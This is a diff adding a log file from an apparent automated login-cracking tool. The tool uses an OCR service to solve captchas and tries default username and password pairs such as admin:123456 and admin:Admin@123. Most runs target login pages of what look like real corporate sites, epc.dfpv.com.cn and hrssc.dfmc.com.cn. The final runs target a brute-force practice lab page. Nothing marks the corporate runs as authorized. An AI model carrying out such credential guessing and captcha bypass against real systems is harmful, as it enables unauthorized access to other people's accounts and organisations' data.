@@ -1,0 +1,220 @@
+2025-02-11 14:52:00 INFO cmd/root.go:34 Program Started
+2025-02-11 14:52:00 INFO root/config.go:55 Target Count => 1
+2025-02-11 14:52:00 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://10.1.2.217:9898"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 14:52:00 INFO [weblogin] weblogin/runner.go:76 Run Started => https://hrssc.dfmc.com.cn/
+2025-02-11 14:52:13 WARN [weblogin] weblogin/runner.go:92 not found login form: not found form: elements not found
+2025-02-11 14:52:13 WARN cmd/root.go:47 Result is Empty
+2025-02-11 14:52:13 INFO cmd/root.go:69 Run Finished spent=12.694860916s
+2025-02-11 14:52:13 INFO cmd/root.go:70 Program Exited
+2025-02-11 14:52:20 INFO cmd/root.go:34 Program Started
+2025-02-11 14:52:20 INFO root/config.go:55 Target Count => 1
+2025-02-11 14:52:20 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://10.1.2.217:9898"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 14:52:20 INFO [weblogin] weblogin/runner.go:76 Run Started => https://hrssc.dfmc.com.cn/
+2025-02-11 14:52:31 WARN [weblogin] weblogin/runner.go:92 not found login form: not found input in form: not found username input: element xpath not found
+2025-02-11 14:52:32 WARN cmd/root.go:47 Result is Empty
+2025-02-11 14:52:32 INFO cmd/root.go:69 Run Finished spent=11.506886875s
+2025-02-11 14:52:32 INFO cmd/root.go:70 Program Exited
+2025-02-11 17:55:39 INFO cmd/root.go:34 Program Started
+2025-02-11 17:55:39 INFO root/config.go:55 Target Count => 1
+2025-02-11 17:55:39 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://10.1.2.217:9898"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 17:55:39 INFO [weblogin] weblogin/runner.go:76 Run Started => https://epc.dfpv.com.cn/
+2025-02-11 17:55:53 INFO [weblogin] weblogin/runner.go:98 login selector =>
+{
+  "userInput": "/html/body/div/div/div[3]/div/form/div[1]/div/div/span/span/input",
+  "passwordInput": "/html/body/div/div/div[3]/div/form/div[2]/div/div/span/span/input",
+  "captchaInput": "/html/body/div/div/div[3]/div/form/div[3]/div/div/span/span/span/span[1]/input",
+  "captchaImg": "/html/body/div/div/div[3]/div/form/div[3]/div/div/span/span/span/span[2]/img",
+  "loginBtn": "/html/body/div/div/div[3]/div/form/div[5]/div/div/span/button"
+}
+2025-02-11 17:55:53 INFO [weblogin] weblogin/runner.go:122 Run Count => 11
+2025-02-11 17:55:53 DEBUG [weblogin] weblogin/runner.go:141 login => admin:123456
+2025-02-11 17:55:53 DEBUG [weblogin] weblogin/runner.go:141 login => admin:1q2w3e4r
+2025-02-11 17:55:53 DEBUG [weblogin] weblogin/runner.go:141 login => admin:12345
+2025-02-11 17:56:11 INFO cmd/root.go:34 Program Started
+2025-02-11 17:56:11 INFO root/config.go:55 Target Count => 1
+2025-02-11 17:56:11 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000/"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 17:56:11 INFO [weblogin] weblogin/runner.go:76 Run Started => https://epc.dfpv.com.cn/
+2025-02-11 17:56:23 INFO [weblogin] weblogin/runner.go:98 login selector =>
+{
+  "userInput": "/html/body/div/div/div[3]/div/form/div[1]/div/div/span/span/input",
+  "passwordInput": "/html/body/div/div/div[3]/div/form/div[2]/div/div/span/span/input",
+  "captchaInput": "/html/body/div/div/div[3]/div/form/div[3]/div/div/span/span/span/span[1]/input",
+  "captchaImg": "/html/body/div/div/div[3]/div/form/div[3]/div/div/span/span/span/span[2]/img",
+  "loginBtn": "/html/body/div/div/div[3]/div/form/div[5]/div/div/span/button"
+}
+2025-02-11 17:56:23 INFO [weblogin] weblogin/runner.go:122 Run Count => 11
+2025-02-11 17:56:23 DEBUG [weblogin] weblogin/runner.go:141 login => admin:12345
+2025-02-11 17:56:23 DEBUG [weblogin] weblogin/runner.go:141 login => admin:123456
+2025-02-11 17:56:23 DEBUG [weblogin] weblogin/runner.go:141 login => admin:1q2w3e4r
+2025-02-11 17:56:31 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 17:56:32 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 17:56:32 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Aa123456
+2025-02-11 17:56:33 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 17:56:33 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin
+2025-02-11 17:56:34 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin123
+2025-02-11 17:56:41 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 17:56:42 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 17:56:42 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin@123
+2025-02-11 17:56:43 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 17:56:43 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Admin@123
+2025-02-11 17:56:44 DEBUG [weblogin] weblogin/runner.go:141 login => admin:P@sswOrd
+2025-02-11 23:40:06 INFO cmd/root.go:34 Program Started
+2025-02-11 23:40:06 INFO root/config.go:55 Target Count => 1
+2025-02-11 23:40:06 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 23:40:06 INFO [weblogin] weblogin/runner.go:76 Run Started => https://epc.dfpv.com.cn/
+2025-02-11 23:40:12 INFO cmd/root.go:34 Program Started
+2025-02-11 23:40:12 INFO root/config.go:55 Target Count => 1
+2025-02-11 23:40:12 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000/"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 23:40:12 INFO [weblogin] weblogin/runner.go:76 Run Started => https://epc.dfpv.com.cn/
+2025-02-11 23:41:30 INFO [weblogin] weblogin/runner.go:98 login selector =>
+{
+  "userInput": "/html/body/div/div/div[3]/div/form/div[1]/div/div/span/span/input",
+  "passwordInput": "/html/body/div/div/div[3]/div/form/div[2]/div/div/span/span/input",
+  "captchaInput": "/html/body/div/div/div[3]/div/form/div[3]/div/div/span/span/span/span[1]/input",
+  "captchaImg": "/html/body/div/div/div[3]/div/form/div[3]/div/div/span/span/span/span[2]/img",
+  "loginBtn": "/html/body/div/div/div[3]/div/form/div[5]/div/div/span/button"
+}
+2025-02-11 23:41:30 INFO [weblogin] weblogin/runner.go:122 Run Count => 11
+2025-02-11 23:41:30 DEBUG [weblogin] weblogin/runner.go:141 login => admin:1q2w3e4r
+2025-02-11 23:41:30 DEBUG [weblogin] weblogin/runner.go:141 login => admin:123456
+2025-02-11 23:41:30 DEBUG [weblogin] weblogin/runner.go:141 login => admin:12345
+2025-02-11 23:41:40 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 23:41:40 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 23:41:40 ERROR [weblogin] weblogin/runner.go:147 login err: not found username input: cannot find element
+2025-02-11 23:41:42 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Aa123456
+2025-02-11 23:41:42 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin123
+2025-02-11 23:41:42 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin
+2025-02-11 23:41:52 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:41:52 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:41:53 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:41:53 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin@123
+2025-02-11 23:41:54 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Admin@123
+2025-02-11 23:41:54 DEBUG [weblogin] weblogin/runner.go:141 login => admin:P@sswOrd
+2025-02-11 23:42:03 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:42:04 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:42:05 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:42:05 DEBUG [weblogin] weblogin/runner.go:141 login => admin:password
+2025-02-11 23:42:05 DEBUG [weblogin] weblogin/runner.go:141 login => admin:quertyuiop
+2025-02-11 23:42:14 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:42:15 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-11 23:42:16 INFO [weblogin] weblogin/runner.go:191 Run Result https://epc.dfpv.com.cn/ => 0
+2025-02-11 23:42:16 INFO [weblogin] weblogin/runner.go:192 Run Finished spent=2m4.8033495s
+2025-02-11 23:42:16 WARN cmd/root.go:47 Result is Empty
+2025-02-11 23:42:16 INFO cmd/root.go:69 Run Finished spent=2m4.810762792s
+2025-02-11 23:42:16 INFO cmd/root.go:70 Program Exited
+2025-02-11 23:58:38 INFO cmd/root.go:34 Program Started
+2025-02-11 23:58:38 INFO root/config.go:55 Target Count => 1
+2025-02-11 23:58:38 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000/"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 23:58:38 INFO [weblogin] weblogin/runner.go:76 Run Started => http://120.46.192.23:90/vul/burteforce/bf_server.php
+2025-02-11 23:59:37 INFO cmd/root.go:34 Program Started
+2025-02-11 23:59:37 INFO root/config.go:55 Target Count => 1
+2025-02-11 23:59:37 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000/"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-11 23:59:37 INFO [weblogin] weblogin/runner.go:76 Run Started => http://120.46.192.23:90/vul/burteforce/bf_server.php
+2025-02-11 23:59:50 INFO [weblogin] weblogin/runner.go:98 login selector =>
+{
+  "userInput": "/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[1]/span/input",
+  "passwordInput": "/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[2]/span/input",
+  "captchaInput": "/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[3]/span/input",
+  "captchaImg": "/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[4]/img",
+  "loginBtn": "/html/body/div[2]/div[2]/div/div[2]/div/div/form/div[2]/label/input"
+}
+2025-02-11 23:59:50 INFO [weblogin] weblogin/runner.go:122 Run Count => 11
+2025-02-11 23:59:50 DEBUG [weblogin] weblogin/runner.go:141 login => admin:1q2w3e4r
+2025-02-11 23:59:50 DEBUG [weblogin] weblogin/runner.go:141 login => admin:12345
+2025-02-11 23:59:50 DEBUG [weblogin] weblogin/runner.go:141 login => admin:123456
